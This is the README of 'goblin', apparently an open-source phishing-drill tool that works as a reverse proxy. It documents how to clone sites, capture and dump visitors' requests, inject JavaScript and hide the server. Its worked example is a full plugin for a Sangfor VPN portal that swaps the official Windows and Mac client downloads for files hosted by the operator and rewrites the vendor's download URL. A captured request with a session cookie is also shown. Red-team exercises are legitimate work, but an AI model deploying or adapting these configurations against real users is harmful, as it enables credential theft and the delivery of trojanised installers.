# goblin 钓鱼演练工具

![GitHub branch checks state](https://img.shields.io/github/checks-status/xiecat/goblin/master)
[![Latest release](https://img.shields.io/github/v/release/xiecat/goblin)](https://github.com/xiecat/goblin/releases/latest)
![GitHub Release Date](https://img.shields.io/github/release-date/xiecat/goblin)
![GitHub All Releases](https://img.shields.io/github/downloads/xiecat/goblin/total)
[![GitHub issues](https://img.shields.io/github/issues/xiecat/goblin)](https://github.com/xiecat/goblin/issues)
[![Docker Pulls](https://img.shields.io/docker/pulls/becivells/goblin)](https://hub.docker.com/r/becivells/goblin)
![Docker Image Size (latest by date)](https://img.shields.io/docker/image-size/becivells/goblin)      
[[English Readme Click Me]](https://github.com/xiecat/goblin/blob/master/README_EN.md)  
goblin 是一款适用于红蓝对抗的钓鱼演练工具。通过反向代理，可以在不影响用户操作的情况下无感知的获取用户的信息，或者诱导用户操作。也可以通过使用代理方式达到隐藏服务端的目的。内置插件，通过简单的配置，快速调整网页内容以达到更好的演练效果


## 特点: 

* 支持缓存静态文件，加速访问
* 支持 dump 所有请求，dump 匹配规则的请求
* 支持通过插件快速配置，调整不合适的跳转或者内容
* 支持植入特定的 js
* 支持修改响应内容或者 goblin 请求的内容
* 支持通过代理方式隐藏真实 IP

快速使用 demo
1. flash demo
```shell
docker run -it --rm  -p 8083:8083 -p 8084:8084 -p 8085:8085 -p 8086:8086  becivells/goblin-demo-flash
```
本机访问 [http://127.0.0.1:8083](http://127.0.0.1:8083) 示例仓库为: [goblin-flash-demo](https://github.com/xiecat/goblin-demo/tree/master/goblin-demo-flash)

2. 默认代理百度的 demo
```shell
docker run -it --rm -v $(pwd):/goblin/ -p 8084:8084 becivells/goblin
```

本机访问 [http://127.0.0.1:8084](http://127.0.0.1:8084)

## 使用文档

请访问: [https://xiecat.github.io/goblin-doc/](https://xiecat.github.io/goblin-doc/)

如果服务器端部署需要修改 ip 地址

```yaml
  Site:
    server_ip:8084:  ## 修改为域名或者 server ip
      Listen: 0.0.0.0
      StaticPrefix: x9ut17jbqa
      SSL: false
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.baidu.com
      Plugin: demo
```



## 命令行参数

```
Usage of goblin:
  -config string
        Webserver port (default "goblin.yaml")
  -gen-plugin string
        Generate rule file
  -log string
        Webserver log file (default "goblin.log")
  -log-level int
        Log mode [1-5] 1.dump All logs include GET log and POST log, 2. Record POST log, 3. Record dump log in rules, 4. Record error log, and 5. Record exception exit log (default 2)
  -print-config
        print config file
  -test-notice
        Test message alarm
  -v    Show version of goblin
  -w    Write config to config file
```



## 配置文件讲解

```yaml
Server: # 服务器一些超时设置默认值即可
  IdleTimeout: 3m0s
  ReadTimeout: 5m0s
  WriteTimeout: 5m0s
  ReadHeaderTimeout: 30s
  ProxyHeader: RemoteAddr  # 获取真实 IP 默认是访问 IP
  StaticDir: static # 本地静态文件目录可以放一些工具，方便使用
  StaticURI: /cgmeuovumtpp/ # 静态文件服务器的访问目录
Proxy:
  MaxIdleConns: 512 # 代理一些配置默认即可
  IdleConnTimeout: 2m0s
  TLSHandshakeTimeout: 1m0s
  ExpectContinueTimeout: 1s
  maxcontentlength: 20971520 # 处理响应数据最大值默认 20M，超过这个值，插件中需要读取 body 的操作会被取消
  ProxyServerAddr: ""   # 设置代理，设置后通过代理进行网页请求
  ProxyCheckURL: https://myip.ipip.net/ # 访问此地址检查代理设置是否正确
  PluginDir: plugins
  Site:
    127.0.0.1:8083: # 请求头的 host 类似于 nginx server_name 如果不匹配 访问不了
      Listen: 0.0.0.0  # 侦听端口。为 127.0.0.1 那么只能本机访问
      StaticPrefix: 8jaojfbykixr # 这个是 InjectJs 模块使用。用于访问注入的 js
      SSL: false  # https
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.douban.com/  # 要代理的地址
      Plugin: "" # 需要使用的插件，目前只能为一个
    127.0.0.1:8084:
      Listen: 0.0.0.0
      StaticPrefix: daulbsly9ysk
      SSL: false
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.baidu.com
      Plugin: ""  # 需要使用的插件，目前只能为一个
Notice:
  dingtalk:
    DingTalk: # 钉钉提醒地址
iplocation:
  type: qqwry   # 地理位置查询数据库
  geo_license_key: ""
log_file: goblin.log
cache:
  type: self  # 可使用的缓存类型 [redis,none,self] self 缓存到本地，redis 缓存到 redis 。none 不使用缓存
  expire_time: 10m0s # 缓存失效时间
  redis:
    host: 127.0.0.1
    port: 6379
    password: hq7TKpR6B11w8
    db: 0
CacheType: # 可缓存的路径后缀。目前带有参数的静态文件不做缓存
- png
- jpg
- js
- jpeg
- css
- otf
- ttf
CacheSize: 12582912 # 最大缓存大小

```



## 插件系统

使用 `-gen-plugin 插件名称(vpn)` 即可生成插件(vpn.yaml)，编写后放到 `plugins` 目录下

在 `goblin.yaml` 中指定规则名称

```yaml
  Site:
    127.0.0.1:8083: # 请求头的 host 类似于 nginx server_name 如果不匹配 访问不了
      Listen: 0.0.0.0  # 侦听端口。为 127.0.0.1 那么只能本机访问
      StaticPrefix: 8jaojfbykixr # 这个是 InjectJs 模块使用。用于访问注入的 js
      SSL: false  # 暂时不可用
      CAKey: ""
      CACert: ""
      ProxyPass: https://www.douban.com/  # 要代理的地址
      Plugin: "vpn" # 需要使用的插件，目前只能为一个
```



### 插件文件讲解

```yaml
Name: sanforvpn_1.0 # 不能为空
Version: 1.0.0 # 不能为空
Description: this is a description # 不能为空
WriteDate: "2021-02-11" # 不能为空
Author: goblin # 不能为空
Rule:
- url: /tttttttt # 匹配的路径
  Match: word # 三种匹配方式 [word,prefix,Suffix] word 是全匹配，prefix 是匹配前缀 suffix 是匹配后缀。这里没有使用正则
  Replace: # 替换模块
  - Request:
      Method: # 匹配到 GET POST 方可执行替换 
      - GET
      - POST
      Header:
        goblin: 1.0.1  # 替换的 header 头内容。为空则是删除。
    Response: # 替换的响应内容
      Status: 200 
      Header: # 替换的 header 头内容。为空则是删除。
        goblinServer: 0.0.1
      Body:
        File: "" # 使用文件替换，这里有值后，ReplaceStr 就不操作了
        ReplaceStr: # 替换字符串
        - Old: Hello World
          New: Hello Word122
          Count: -1
        Append: "" # 追加字符串
- url: /dump
  Match: word
  Dump:  # 需要 dump 下的数据
  - Request:
      Method: # 匹配到如下请求方式方可操作
      - POST
    Response:
      Status: 200
      Header: {} 
      Body: "" # 
    notice: false # 是否进行钉钉提醒
- url: /test.js ## 待替换的 js 尽量选择全局 js
  Match: word ## 匹配方式
  InjectJs:
    File: aaa.js ## 要替换的 js 可以为文件或者 url

```

变量

`{{ .Static }}` 对应的是静态服务器的目录

目前只有 Replace 的 `Replace.Response.Header.Location`， `InjectJs`，`Replace.Response.Body.Append`,`rp.Response.Body.ReplaceStr.New` 可以使用

## 代理设置

goblin 使用反向代理，前端使用 cf 等代理 goblin， 即可隐藏 goblin 主机

## JS 注入

js 注入有两种方式一种是跟着页面走(Replace 需要自己追加` \<script\> ` 标签)，一种是跟着全局 js 文件走各有好处。

这两种其实都是使用 Replace 功能

### 使用 InjectJs 注入

```yaml
- url: /base.js # 待替换的js 尽量选择全局 js
  Match: word   # 匹配方式
  InjectJs:
    File: aaa.js # 要替换的 js。 可以为文件或者 url
```

### 使用 replace 注入

```yaml
- url: /art_103.html # 待替换的网页
  Match: Word
  Replace: # 替换模块
    - Request:
        Method: # 匹配到如下请求方式方可替换
          - GET
          - POST
        Header:
          goblin: 1.0.1  # 替换的 header 头内容。为空则是删除。
      Response: # 替换的响应内容
        Body:
          Append: "<script type='text/javascript' src='{{ .Static }}a.js'></script>" # 追加字符串
```



## 案例

### 深信服 vpn 客户端替换

这里以深信服下载文件为例写一个插件

访问得知深信服 vpn 的 windows 客户端可以直接下载。mac 客户端需要从官方链接下载

#### 访问主页时会跳转到正确网址登录入口`/portal/#!/login`，这里直接修改

```yaml
Rule:
- url: /  ## 访问
  Match: word # 一定要使用全匹配
  Replace:
  - Request:
      Method:
      - GET
    Response:
      Status: 302
      Header:
        Location: /portal/#!/login
```

### exe 程序替换

```yaml
- url: /com/EasyConnectInstaller.exe
  Match: word
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Status: 302
        Header:
          Location: "{{ .Static }}/EasyConnectInstaller.exe" # cgmeuovumtpp 为静态文件目录
```

### Mac 程序替换

mac 下载地址是在 js 里面这里可以直接替换，也可以通过跳转替换

修改路径跳转到 goblin 地址

```yaml
- url: /portal/jssdk/api/common.js
  Match: prefix # 带有参数使用前缀匹配
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Body:
          ReplaceStr:
            - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
              New: /download/product/sslvpn/pkg/
              Count: -1
```

下载地址替换为修改的地址

```
- url: /download/product/sslvpn/pkg/
  Match: prefix
  Replace:
    - Request:
        Method:
          - GET
      Response:
        Status: 302
        Header:
          Location: "{{ .Static }}/EasyConnect.dmg"
```

## 钉钉提醒

Exe

```
  - url: /com/EasyConnectInstaller.exe
    Match: word
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```

dmg

```yaml
  - url: /portal/jssdk/api/common.js
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Body:
            ReplaceStr:
              - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
                New: /download/product/sslvpn/pkg/
                Count: -1
  - url: /download/product/sslvpn/pkg/
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}/EasyConnect.dmg" //
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```



## 完整的插件如下

```yaml
Name: sanfor vpn
Version: 1.0.0
Description: this is a description
WriteDate: "2021-02-11"
Author: goblin
Rule:
  - url: /  ## 访问
    Match: word
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            goblinServer: 0.0.1
            Location: /portal/#!/login
  - url: /com/EasyConnectInstaller.exe
    Match: word
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}EasyConnectInstaller.exe"
  - url: /portal/jssdk/api/common.js
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Body:
            ReplaceStr:
              - Old: http://download.sangfor.com.cn/download/product/sslvpn/pkg/
                New: /download/product/sslvpn/pkg/
                Count: -1
  - url: /download/product/sslvpn/pkg/
    Match: prefix
    Replace:
      - Request:
          Method:
            - GET
        Response:
          Status: 302
          Header:
            Location: "{{ .Static }}EasyConnect.dmg"
    Dump:
      - Request:
          Method:
            - GET
        notice: true

  - url: /com/EasyConnectInstaller.exe
    Match: word
    Dump:
      - Request:
          Method:
            - GET
        notice: true
```



访问后收到钉钉告警同时 dump 如下请求内容

```
GET /download/product/sslvpn/pkg/mac_767/EasyConnect_7_6_7_4.dmg HTTP/1.1
Host: vpn.xxxxx.com
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Cookie: language=zh_CN; TWFID=7c0a08ff5295831d
Referer: http://127.0.0.1:8085/portal/
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0
X-Forwarded-For: 127.0.0.1
```
## FAQ
1. 有些网站改完会直接 302 跳转到正常页面怎么也取消不了,最终发现解决方法加 xff xfi 头
```yaml
      - Request:
          Method:
            - GET
          Header:
            x-forwarded-for: 127.0.0.1
            x-real-ip: 127.0.0.1
```

## Todo 

3. websocket 支持
4. 插件系统增强（内置变量）更多匹配规则
3. 前端记录输入框输入

## 致谢

感谢`小明(Master)`的使用、反馈和建议，[\_0xf4n9x\_](https://github.com/FanqXu) 的建议。[judas](https://github.com/JonCooperWorks/judas) 带来的灵感，还有参考其他项目，才得以快速实现

## 意见交流

您可以直接在GIthub仓库中提交ISSUE：https://github.com/xiecat/goblin/issues

与此同时您可以扫描下方群聊二维码加入我们的微信讨论群：

<img alt="QR-code" src="./wechat_group.jpg" width="50%" height="50%" style="max-width:100%;">
